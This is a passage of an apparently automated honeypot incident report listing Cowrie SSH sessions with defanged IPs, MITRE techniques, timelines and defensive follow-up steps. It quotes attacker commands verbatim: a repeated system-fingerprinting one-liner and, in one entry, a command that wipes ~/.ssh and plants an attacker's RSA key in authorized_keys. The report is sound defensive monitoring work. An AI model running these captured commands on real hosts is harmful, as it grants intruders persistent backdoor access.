- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e44ff5d917f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:34 |
| **Last Seen** | 2026-07-06 03:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:34:42` | `cowrie.session.connect` |
| `2026-07-06 03:34:43` | `cowrie.client.version` |
| `2026-07-06 03:34:43` | `cowrie.client.kex` |
| `2026-07-06 03:34:45` | `cowrie.login.success` |
| `2026-07-06 03:34:47` | `cowrie.session.params` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.success` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.command.input` |
| `2026-07-06 03:34:47` | `cowrie.log.closed` |
| `2026-07-06 03:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5ebeb565f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:35 |
| **Last Seen** | 2026-07-06 03:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:35:41` | `cowrie.session.connect` |
| `2026-07-06 03:35:42` | `cowrie.client.version` |
| `2026-07-06 03:35:42` | `cowrie.client.kex` |
| `2026-07-06 03:35:44` | `cowrie.login.success` |
| `2026-07-06 03:35:46` | `cowrie.session.params` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.success` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.command.input` |
| `2026-07-06 03:35:46` | `cowrie.log.closed` |
| `2026-07-06 03:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fce4a999f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:36 |
| **Last Seen** | 2026-07-06 03:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:36:38` | `cowrie.session.connect` |
| `2026-07-06 03:36:39` | `cowrie.client.version` |
| `2026-07-06 03:36:39` | `cowrie.client.kex` |
| `2026-07-06 03:36:42` | `cowrie.login.success` |
| `2026-07-06 03:36:43` | `cowrie.session.params` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.success` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:43` | `cowrie.command.input` |
| `2026-07-06 03:36:44` | `cowrie.log.closed` |
| `2026-07-06 03:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ad56fc3302

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:37 |
| **Last Seen** | 2026-07-06 03:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:37:36` | `cowrie.session.connect` |
| `2026-07-06 03:37:37` | `cowrie.client.version` |
| `2026-07-06 03:37:37` | `cowrie.client.kex` |
| `2026-07-06 03:37:39` | `cowrie.login.success` |
| `2026-07-06 03:37:41` | `cowrie.session.params` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.success` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.command.input` |
| `2026-07-06 03:37:41` | `cowrie.log.closed` |
| `2026-07-06 03:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159f51b0666c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:38 |
| **Last Seen** | 2026-07-06 03:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:38:34` | `cowrie.session.connect` |
| `2026-07-06 03:38:34` | `cowrie.client.version` |
| `2026-07-06 03:38:34` | `cowrie.client.kex` |
| `2026-07-06 03:38:37` | `cowrie.login.success` |
| `2026-07-06 03:38:38` | `cowrie.session.params` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.success` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:38` | `cowrie.command.input` |
| `2026-07-06 03:38:39` | `cowrie.log.closed` |
| `2026-07-06 03:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c480d9e6348

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 03:38 |
| **Last Seen** | 2026-07-06 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:38:59` | `cowrie.session.connect` |
| `2026-07-06 03:38:59` | `cowrie.client.version` |
| `2026-07-06 03:39:00` | `cowrie.client.kex` |
| `2026-07-06 03:39:00` | `cowrie.login.success` |
| `2026-07-06 03:39:00` | `cowrie.direct-tcpip.request` |
| `2026-07-06 03:39:00` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 03:39:00` | `cowrie.direct-tcpip.data` |
| `2026-07-06 03:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ddad43bcb0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 03:39 |
| **Last Seen** | 2026-07-06 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:39:22` | `cowrie.session.connect` |
| `2026-07-06 03:39:22` | `cowrie.client.version` |
| `2026-07-06 03:39:22` | `cowrie.client.kex` |
| `2026-07-06 03:39:23` | `cowrie.login.success` |
| `2026-07-06 03:39:23` | `cowrie.direct-tcpip.request` |
| `2026-07-06 03:39:23` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 03:39:23` | `cowrie.direct-tcpip.data` |
| `2026-07-06 03:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acf57deacd31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:39 |
| **Last Seen** | 2026-07-06 03:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:39:32` | `cowrie.session.connect` |
| `2026-07-06 03:39:32` | `cowrie.client.version` |
| `2026-07-06 03:39:32` | `cowrie.client.kex` |
| `2026-07-06 03:39:34` | `cowrie.login.success` |
| `2026-07-06 03:39:36` | `cowrie.session.params` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.success` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:36` | `cowrie.command.input` |
| `2026-07-06 03:39:37` | `cowrie.log.closed` |
| `2026-07-06 03:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0811712c9c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 03:40 |
| **Last Seen** | 2026-07-06 03:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:40:28` | `cowrie.session.connect` |
| `2026-07-06 03:40:30` | `cowrie.client.version` |
| `2026-07-06 03:40:30` | `cowrie.client.kex` |
| `2026-07-06 03:40:36` | `cowrie.login.success` |
| `2026-07-06 03:40:40` | `cowrie.session.params` |
| `2026-07-06 03:40:40` | `cowrie.command.input` |
| `2026-07-06 03:40:41` | `cowrie.log.closed` |
| `2026-07-06 03:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6119e540ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:40 |
| **Last Seen** | 2026-07-06 03:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:40:30` | `cowrie.session.connect` |
| `2026-07-06 03:40:30` | `cowrie.client.version` |
| `2026-07-06 03:40:30` | `cowrie.client.kex` |
| `2026-07-06 03:40:32` | `cowrie.login.success` |
| `2026-07-06 03:40:34` | `cowrie.session.params` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.success` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:34` | `cowrie.command.input` |
| `2026-07-06 03:40:35` | `cowrie.log.closed` |
| `2026-07-06 03:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b021c1bff2da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:41 |
| **Last Seen** | 2026-07-06 03:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:41:26` | `cowrie.session.connect` |
| `2026-07-06 03:41:26` | `cowrie.client.version` |
| `2026-07-06 03:41:26` | `cowrie.client.kex` |
| `2026-07-06 03:41:29` | `cowrie.login.success` |
| `2026-07-06 03:41:30` | `cowrie.session.params` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.success` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:30` | `cowrie.command.input` |
| `2026-07-06 03:41:31` | `cowrie.log.closed` |
| `2026-07-06 03:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa69f38d44c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:42 |
| **Last Seen** | 2026-07-06 03:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:42:23` | `cowrie.session.connect` |
| `2026-07-06 03:42:23` | `cowrie.client.version` |
| `2026-07-06 03:42:23` | `cowrie.client.kex` |
| `2026-07-06 03:42:26` | `cowrie.login.success` |
| `2026-07-06 03:42:27` | `cowrie.session.params` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.success` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:27` | `cowrie.command.input` |
| `2026-07-06 03:42:28` | `cowrie.log.closed` |
| `2026-07-06 03:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999ca9736845

| Field | Detail |
|---|---|
| **Source IP** | `1.92.102[.]164` |
| **First Seen** | 2026-07-06 03:42 |
| **Last Seen** | 2026-07-06 03:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:42:50` | `cowrie.session.connect` |
| `2026-07-06 03:42:50` | `cowrie.client.version` |
| `2026-07-06 03:42:50` | `cowrie.client.kex` |
| `2026-07-06 03:42:51` | `cowrie.login.success` |
| `2026-07-06 03:42:52` | `cowrie.session.params` |
| `2026-07-06 03:42:52` | `cowrie.command.input` |
| `2026-07-06 03:42:52` | `cowrie.command.failed` |
| `2026-07-06 03:42:53` | `cowrie.log.closed` |
| `2026-07-06 03:42:53` | `cowrie.session.params` |
| `2026-07-06 03:42:53` | `cowrie.command.input` |
| `2026-07-06 03:42:54` | `cowrie.session.file_download` |
| `2026-07-06 03:42:54` | `cowrie.log.closed` |
| `2026-07-06 03:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.92.102[.]164` to AbuseIPDB if not already reported
- [ ] Block `1.92.102[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa4560e136a8

| Field | Detail |
|---|---|
| **Source IP** | `1.92.102[.]164` |
| **First Seen** | 2026-07-06 03:42 |
| **Last Seen** | 2026-07-06 03:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:42:54` | `cowrie.session.connect` |
| `2026-07-06 03:42:54` | `cowrie.client.version` |
| `2026-07-06 03:42:54` | `cowrie.client.kex` |
| `2026-07-06 03:42:56` | `cowrie.login.success` |
| `2026-07-06 03:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.92.102[.]164` to AbuseIPDB if not already reported
- [ ] Block `1.92.102[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c579a5ab34d8

| Field | Detail |
|---|---|
| **Source IP** | `1.92.102[.]164` |
| **First Seen** | 2026-07-06 03:42 |
| **Last Seen** | 2026-07-06 03:42 |
